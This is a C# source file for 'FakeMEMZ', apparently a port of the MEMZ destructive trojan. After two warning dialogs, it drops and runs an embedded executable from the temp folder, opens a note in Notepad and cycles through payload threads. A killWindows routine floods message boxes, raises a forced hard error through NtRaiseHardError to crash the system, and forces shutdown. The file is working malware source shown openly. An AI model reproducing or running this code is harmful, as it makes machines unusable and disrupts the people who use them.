using System;
using static FakeMEMZ.payloads;
using static FakeMEMZ.utils;
using static FakeMEMZ.WinAPI;
using static FakeMEMZ.data;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;

namespace FakeMEMZ
{
    using HANDLE = System.IntPtr;
    using ATOM = System.UInt16;
    using BOOL = System.Int32;
    using DWORD = System.UInt32;
    using HBRUSH = System.IntPtr;
    using HCURSOR = System.IntPtr;
    using HICON = System.IntPtr;
    using HINSTANCE = System.IntPtr;
    using HMENU = System.IntPtr;
    using HWND = System.IntPtr;
    using LRESULT = System.IntPtr;
    using LPARAM = System.IntPtr;
    using WPARAM = System.IntPtr;
    using HDC = System.IntPtr;
    internal unsafe class main
    {

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                DPI();
                if (MessageBox(NULL, "The software you just executed is considered malware." + Environment.NewLine + "This malware will harm your computer and makes it unusable." + Environment.NewLine + "If you are seeing this message without knowing what you just executed, simply press No and nothing will happen." + Environment.NewLine + "If you know what this malware does and are using a safe environment to test, press Yes to start it." + Environment.NewLine + Environment.NewLine + "DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE ? ", "MEMZ", 0x00000004 | 0x00000030) != 6 || MessageBox(IntPtr.Zero, "THIS IS THE LAST WARNING!" + Environment.NewLine + Environment.NewLine + "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!" + Environment.NewLine + "STILL EXECUTE IT ? ", "MEMZ", 0x00000004 | 0x00000030) != 6)
                {
                    ExitProcess(0);
                }

                utils utils = new utils();
                utils.MEMZ_PROC();
            }
            else
            {
                for (int i = 0; i < args.Length; i++)
                {
                    if (args[i] == "/loop")
                    {
                        Thread.Sleep(1000000000);
                    }
                    if (args[i] == "/normal")
                    {
                        DPI();
                        FileStream fs = new FileStream(Path.GetTempPath() + "Nyan.exe", FileMode.Create, FileAccess.Write);
                        fs.Write(code1, 0, code1_len);
                        fs.Close();

                        Process nyan = Process.Start(Path.GetTempPath() + "Nyan.exe");
                        nyan.WaitForExit();

                        File.Delete(Path.GetTempPath() + "Nyan.exe");

                        HANDLE note = CreateFileA(Path.GetTempPath() + "\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
                        uint wb;

                        if (note == INVALID_HANDLE_VALUE)
                        {
                            ExitProcess(4);
                        }
                        if (!WriteFile(note, msg, (uint)msg_len, out wb, NULL))
                        {
                            ExitProcess(5);
                        }
                        CloseHandle(note);

                        ShellExecuteA(NULL, null, "notepad", Path.GetTempPath() + "\\note.txt", null, 10);

                        Thread.Sleep(30000);

                        int p = 0;
                        for (int t = 0; t < 10; t++)
                        {
                            p++;
                            PayloadsThread(payload[p]);
                            Thread.Sleep(20000);
                        }

                        for (; ; )
                        {
                            Thread.Sleep(20000);
                        }
                    }
                }
            }
        }
        public static void killWindows()
        {
            for (int i = 0; i < 20; i++)
            {
                PayloadsStart(main.ripMessageThread);
                Thread.Sleep(100);
            }
            main.killWindowsInstant();
        }
        public static void killWindowsInstant()
        {
            DWORD STATUS_ASSERTION_FAILURE = 0xC0000022;
            RtlAdjustPrivilege(19, true, false, out bool previousValue);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, out DWORD Response);

            bool bUnused;
            RtlAdjustPrivilege(19 /* SeShutdownPrivilege */, true, false, out bUnused);
            NtSetSystemPowerState(6, 6, 0x00010000 | 0x0000000a);
            NtShutdownSystem(1);
            ExitWindowsEx(0x00000002, 0x00000004);
        }
        public static void ripMessageThread()
        {
            Random random = new Random();
            FindAndMoveMsgBox(random.Next() % GetSystemMetrics(0)-200, random.Next() % GetSystemMetrics(1)-200, true, "MEMZ");
            //MsgBox1.Show(null, msgs[random.Next() % nMsgs], "MEMZ", MessageBoxButtons.OK, MessageBoxIcon.Error);
            MessageBox(NULL, msgs[random.Next() % nMsgs], "MEMZ", 0 | 4096 | 16);
        }
    }
}